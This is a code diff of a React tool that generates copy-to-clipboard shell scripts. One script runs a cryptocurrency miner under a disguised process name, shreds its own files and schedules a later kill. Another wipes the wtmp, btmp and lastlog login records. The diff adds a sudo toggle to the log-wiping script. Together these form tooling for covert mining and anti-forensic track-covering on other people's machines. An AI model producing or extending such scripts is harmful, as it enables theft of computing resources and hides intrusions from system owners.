@@ -22,12 +22,14 @@ const App = () => {
   const [configFilename, setConfigFilename] = useState('c')
   const [killAt, setKillAt] = useState('now + 10 hours')
   const [message, setMessage] = useState('')
+  const [sudoFlag, setSudoFlag] = useState(true)
 
   const clipboard = navigator.clipboard
 
   const ethScript = ` echo ${Buffer.from(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && shred -uz nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
 
-  const clearLoginHistoryScript = ` sudo sh -c 'echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog'`
+  const clearLoginHistoryScript = ` echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog`
+  const clearLoginHistoryScriptWithSudo = ` sudo sh -c '${clearLoginHistoryScript}'`
 
   const handleCopyETHScriptBtnClick = () => {
     clipboard.writeText(ethScript).then(() => {
@@ -43,7 +45,8 @@ const App = () => {
   }
 
   const handleCopyClearLoginHistoryScriptBtnClick = () => {
-    clipboard.writeText(clearLoginHistoryScript).then(() => {
+    const script = sudoFlag ? clearLoginHistoryScriptWithSudo : clearLoginHistoryScript
+    clipboard.writeText(script).then(() => {
       setMessage('Copy clear login history script successful')
     }).catch((e) => {
       console.error(e)
@@ -53,6 +56,10 @@ const App = () => {
         setMessage('')
       }, 3000)
     })
+  }
+
+  const handleSudoCheckboxChange = (e: { target: { checked: boolean } }) => {
+    setSudoFlag(e.target.checked)
   }
 
   const handleSaveDataToLocalStorageBtnClick = () => {
@@ -168,11 +175,21 @@ const App = () => {
           />
           <button onClick={handleCopyETHScriptBtnClick}>Copy ETH script</button>
         </div>
-        <div className="field-row-stacked">
+        <div className="field-row">
           <label>Clear login history script</label>
+          <span> </span>
+          <input
+            type="checkbox"
+            id="sudo"
+            checked={sudoFlag}
+            onChange={handleSudoCheckboxChange}
+          />
+          <label htmlFor="sudo">sudo</label>
+        </div>
+        <div className="field-row-stacked">
           <textarea
             disabled
-            value={clearLoginHistoryScript}
+            value={sudoFlag ? clearLoginHistoryScriptWithSudo : clearLoginHistoryScript}
           />
           <button onClick={handleCopyClearLoginHistoryScriptBtnClick}>Copy clear login history script</button>
         </div>
